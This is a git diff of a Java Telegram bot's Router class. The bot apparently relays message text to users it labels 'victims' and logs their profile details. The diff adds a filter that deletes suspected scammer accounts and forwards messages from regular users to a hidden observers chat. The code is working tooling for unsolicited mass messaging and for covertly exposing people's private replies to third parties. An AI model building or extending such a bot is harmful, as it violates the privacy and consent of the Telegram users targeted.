@@ -6,7 +6,6 @@ import com.pnet.routing.MessageImpl;
 import com.pnet.routing.RoutingMessage;
 import com.pnet.secure.Config;
 import com.pnet.telega.TdApiException;
-import it.tdlight.tdlib.TdApi;
 import it.tdlight.tdlight.utils.CantLoadLibrary;
 
 import java.io.*;
@@ -87,6 +86,10 @@ public class Router {
         return true;
     }
 
+    private void logInfo(String message){
+        Logger.getGlobal().info(message);
+    }
+
     private void processMessage(RoutingMessage msg) {
         //?Не имеет смысла, т.к. на поступившее сообщение отвечаем в любом случае
         //UPD: не в любом, -по стандартному алгоритму, чтобы не тратить живые сообщения
@@ -99,9 +102,26 @@ public class Router {
 
         //TODO: (?) Переместить в com.pnet.Router.incomingMessage
         if (null!=victim){
-            config.victims.moveToFirst(victim.id);
-            config.lastIncomingMessageMoment=LocalDateTime.now();
+            boolean userRegularNotScam = false;
+            try {
+                userRegularNotScam = isUserRegularNotScam(victim);
+            } catch (Exception e) {
+                e.printStackTrace();
+                return;
+            }
+            if(userRegularNotScam) {
+                config.victims.moveToFirst(victim.id);
+                config.lastIncomingMessageMoment = LocalDateTime.now();
+            }else{
+                logInfo("Deleting victim:\n"+victimPrintInfo(victim));
+                config.victims.remove(victim);
+                config.incomingMessages.remove(msg);
+            }
             save();
+
+            if(userRegularNotScam)
+                messageForwardToObservers(msg);
+
         }else if (!msg.isGreeting()){
             config.incomingMessages.remove(msg);
             return;
@@ -117,6 +137,20 @@ public class Router {
         }
         if(!Debug.debug.dontAddVictims&&addMoreVictims())
             processMessage(msg);
+    }
+
+    private void messageForwardToObservers(RoutingMessage msg) {
+        telega.forwardMessage(msg, Config.OBSERVERS_CHAT_ID);
+    }
+
+    private String victimPrintInfo(Victim victim) {
+        User user=null;
+        try {
+            user=telega.getUserInterface(victim.id, victim.groupName);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return String.format("victim:\n%suser:\n%s", victim, user);
     }
 
     private void setUserLastSeen(int id, LocalDateTime lastSeenNotBefore) {
@@ -184,14 +218,8 @@ public class Router {
         }
 
         try {
-            User user=null;
-            try {
-                user=telega.getUserInterface(victim.id, victim.groupName);
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-            Logger.getGlobal().info(String.format("Reproducing message:\n%s\nto victim:\n%s\nuser:\n%s",
-                    msg, victim, user));
+            logInfo(String.format("Reproducing message:\n%s\nto:\n%s",
+                    msg, victimPrintInfo(victim)));
             if(!Debug.debug.dontReallySendMessages)
                 telega.sendMessage(victim.id, msg.getText());
             msg.setReproducedCount(msg.getReproducedCount()+1);
